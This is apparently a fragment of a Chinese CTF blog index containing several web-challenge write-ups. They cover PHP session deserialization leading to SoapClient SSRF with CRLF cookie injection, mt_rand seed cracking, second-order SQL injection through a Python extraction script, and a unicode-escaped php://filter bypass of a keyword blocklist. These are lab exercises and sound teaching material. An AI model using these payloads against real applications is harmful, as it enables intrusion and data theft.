+<p>因为没有其他的利用点，应该就是利用session反序列化，序列化与反序列化引擎的差别导致的反序列化漏洞</p>
+<p>php引擎格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name|s:5:&quot;Smi1e&quot;;</span><br><span class="line"></span><br><span class="line">key|序列化value</span><br></pre></td></tr></table></figure>
+
+<p>php_serialize引擎格式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125;</span><br><span class="line">全序列化</span><br></pre></td></tr></table></figure>
+
+<p>这样就导致了反序列化注入的漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如，如果我们输入的是</span><br><span class="line">$_SESSION[&#x27;abcd&#x27;]=&#x27;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#x27;;</span><br><span class="line">序列化是按照php_serialize引擎来执行的就应该是</span><br><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</span><br><span class="line">而反序列化是按照php来执行，那么前面的a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;就会被当作key后面的被当成了内容</span><br></pre></td></tr></table></figure>
+
+<p>将session_handler的序列化引擎改变，这样|分隔符后面的内容就被当做是经过序列化之后的内容会进行一次反序列化这样就能够完成一次反序列化的攻击</p>
+<p>那么该怎么利用这个漏洞呢</p>
+<p>可以利用<code>call_user_func后面的参数可控</code>然后我们呢将题目中的引擎改变构造出</p>
+<p>session_start(array(‘serialize_handler’=&gt;’php_serialize’))</p>
+<p>也就相当于将其中的引擎</p>
+<p><strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</strong></p>
+<p>然后再name处添加我们的<code>|exp</code></p>
+<p>需要利用到soap进行ssrf</p>
+<p>SoapClient对象中的方法进行SSRF请求，SoapClient类中有一个__call魔术方法，所以我们只需要找到一个能够调用SoapClient的不存在方法的地方即可</p>
+<p>两个call_user_func给我们提供的方法</p>
+<p>想到利用extract进行变量覆盖</p>
+<p>将<code>call_user_func($b, $a);</code>构造成<code>call_user_func(call_user_func, $a);</code>的形式而a是一个数组，他的第一个变量可控，数组在call_user_func中</p>
+<p>会将key作为类value作为方法</p>
+<p>那么如果我们</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = array(reset($_SESSION[&#x27;SoapClient&#x27;]), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func(call_user_func, $a);</span><br></pre></td></tr></table></figure>
+
+<p>这样的话他就会调用SoapClient里面的welcome_to_the_lctf2018方法，因为没有这个方法所以直接进入__call魔术方法</p>
+<p>而soap魔术方法是内置一个CRLF漏洞的</p>
+<p>我们知道请求头与请求体的分割就是由两个\r\n来分割的，我们可以在里面添加一些恶意的换行来注入我们想要的cookie而如果这个cookie可控而且页面将里面的session内容打印出来了，flag的内容就存在这个session内容当中所以我们只需要利用ssrf访问内容然后设定其中的PHPSESSID成我们自己知道的，在index页面直接访问即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;paixiaoxing\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span> ));</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>step1：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A38%3A%22paixiaoxing%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line">post:serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>
+
+<p>step2:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:?f=extracr&amp;name=SoapClient</span><br><span class="line">post:b=call_user_func</span><br></pre></td></tr></table></figure>
+
+<p>触发反序列化ssrf</p>
+<p>step3:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">header:</span><br><span class="line">Cookie:PHPSESSID=123456</span><br></pre></td></tr></table></figure>
+
+<p>即可查看到此session中的内容</p>
+]]></content>
+      <tags>
+        <tag>LCTF2018</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2020-Ezaudit</title>
+    <url>/2022/04/14/MRCTF2020-Ezaudit/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>打开是一个页面，但是题目的名字是简单审计</p>
+<p>猜测有源码泄露</p>
+<p>寻找一番，找到了访问<a class="link" href="http://www.zip发现index.php/">www.zip发现index.php<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        <span class="variable">$link</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$getuser</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//私钥</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$Public_key</span> = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>
+
+<p>给出了公钥，需要求出私钥，猜测题目意思应该是他们的种子是一样的，我们需要根据这个公钥求出种子，然后让这个种子生成私钥，将私钥传入登录即可</p>
+<p>回到上面的登录页面发现，当我们的私钥正确之后会进入一个查询语句，只需要我们的密码正确即可，但是对这个password没有任何的过滤，所以我们可以直接万能密码绕过即可</p>
+<p>先根据这个公钥恢复成<code>php_mt_seed</code>能够识别的数据：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>然后丢到<code>php_mt_seed</code>脚本里面去跑就行了</p>
+<p>最后结果应该是</p>
+<p>1775196155</p>
+<p>然后生成私钥即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">  <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">  <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>登录拿flag</p>
+]]></content>
+      <tags>
+        <tag>MRCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Welcome-to-Earth</title>
+    <url>/2022/04/08/Welcome-to-Earth/</url>
+    <content><![CDATA[<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进入页面之后过几秒种会跳转到die页面</p>
+<p>在这几秒内查看一下网页源码（也可以抓包直接看不会变）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.onkeydown = function(event) &#123;</span><br><span class="line">  event = event || window.event;</span><br><span class="line">  if (event.keyCode == 27) &#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    window.location = &quot;/chase/&quot;;</span><br><span class="line">  &#125; else die();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function sleep(ms) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function dietimer() &#123;</span><br><span class="line">  await sleep(10000);</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function die() &#123;</span><br><span class="line">  window.location = &quot;/die/&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现还隐藏一个页面/chase/写在前端直接进就行</p>
+<p>又发现隐藏一个leftt页面</p>
+<p>shoot</p>
+<p>door</p>
+<p>door页面的话有点不同，他的页面上的所有点都是没用的，你点击submit之后会直接跳转到die</p>
+<p>但是页面给出了js，减去发现open路由</p>
+<p>同样的操作进入fight</p>
+<p>到了这里的js就可以看到flag了，其实一眼也就看出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>b01lers2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯-Unfinish</title>
+    <url>/2022/04/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-Unfinish/</url>
+    <content><![CDATA[<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>磨磨唧唧写了半天脚本总算是完成了</p>
+<p>有个登录页面，猜测有一个注册页面</p>
+<p>进去注册登录，进去之后发现啥也按不了，所有页面只有一个注册时用户名的信息猜测有sql注入注入点在username</p>
+<p>测试发现过滤了<code>,以及information</code></p>
+<p>而且一般这种注册之后放到index页面的语句应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert table values (&#x27;email&#x27;,&#x27;username&#x27;,password)</span><br></pre></td></tr></table></figure>
+
+<p>既然注入点在username，而在sql中如果可以运用hex将字符串转换成16进制读出来，而进行两次hex之后就不会出现字母可以利用这一点然后来读取index页面的username去两次hex解析就能拿到我们想要的信息因为回显是数字形式，所以可以构造username为<code>0&#39;+构造语句+&#39;0</code></p>
+<p>这点sql跟php类似，会我们将前面构造成0后面构造成0他就会转换成数字再相加，最后得到我们想要的hex编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+( hex(hex((select database() ))))+&#x27;0</span><br></pre></td></tr></table></figure>
+
+<p>这样注册之后发现，这里有长度限制，只能回显10个数字需要加上substr但是逗号被ban了，可以用from for 替换</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def reg(url,email,payload,password):</span><br><span class="line">	urlr = url + &#x27;register.php&#x27;</span><br><span class="line">	data = &#123;</span><br><span class="line">		&#x27;email&#x27;:email,</span><br><span class="line">		&#x27;username&#x27;:payload,</span><br><span class="line">		&#x27;password&#x27;:password</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(urlr,data)</span><br><span class="line"></span><br><span class="line">def log(url,email,password):</span><br><span class="line">	urlr = url + &#x27;login.php&#x27;</span><br><span class="line">	data = &#123;</span><br><span class="line">		&#x27;email&#x27;:email,</span><br><span class="line">		&#x27;password&#x27;:password</span><br><span class="line">	&#125;</span><br><span class="line">	session.post(urlr,data)</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	url = &#x27;http://7cd63c31-816e-4788-8cf8-f44be499bcc7.node4.buuoj.cn:81/&#x27;</span><br><span class="line">	email = str(i) + &#x27;11123133356@1234.com&#x27;</span><br><span class="line">	payload = &quot;0&#x27;+( substr(hex(hex((select * from flag ))) from &#123;&#125; for 10))+&#x27;0&quot;.format((i-1)*10+1)</span><br><span class="line">	password = &#x27;admin&#x27;</span><br><span class="line">	reg(url,email,payload,password)</span><br><span class="line">	log(url,email,password)</span><br><span class="line">	urli = url + &#x27;index.php&#x27;</span><br><span class="line">	io = session.get(url)</span><br><span class="line">	#io.encoding=&quot;utf-8&quot;</span><br><span class="line">	#print(io.text)</span><br><span class="line">	html = etree.HTML(io.text)</span><br><span class="line">	a = html.xpath(&#x27;//span[@class=&quot;user-name&quot;]/text()&#x27;)</span><br><span class="line">	#print(type(a))</span><br><span class="line">	if(a[0] == &#x27;\n            0          &#x27;):</span><br><span class="line">		break</span><br><span class="line">	else:</span><br><span class="line">		m = re.search(&quot;3.* &quot;, str(a)).group(0)[:10]</span><br><span class="line">		#print(m)</span><br><span class="line">		result += m</span><br><span class="line">		sleep(0.4)</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>然后拿去解码一下就行了。</p>
+]]></content>
+      <tags>
+        <tag>网鼎杯2018</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>encode-and-encode</title>
+    <url>/2022/04/09/encode-and-encode/</url>
+    <content><![CDATA[<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>进入题目不难找到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>通读一下源码发现：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = file_get_contents(<span class="variable">$page</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !is_valid(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>她会将我们post传入的参数进行一次json的解码，然后进行判断body是否有效，需要里面含有key:page</p>
+<p>然后获取page的value进行file_get_contents</p>
+<p>我们可以传入一个json键值对，然后输入一个文件即可，但是这个内容需要经过上面的过滤，也就是说不能有协议、目录以及flag</p>
+<p>如果查到content里面有相关的ctf内容，替换成content</p>
+<p>可以用unicode编码一下，在json编码的时候会支持unicode编码，所以直接对我们输入的内容进行编码然后当作page的value就行</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;php://filter/convert.banse64-encode/resource=/flag&quot;&#125;</span><br><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接拿到flag</p>
+<p><img src="/2022/04/09/encode-and-encode/1.png" alt="1"></p>
+<p>解码即可</p>
+]]></content>
+      <tags>
+        <tag>HarekazeCTF2019</tag>
       </tags>
   </entry>
 </search>
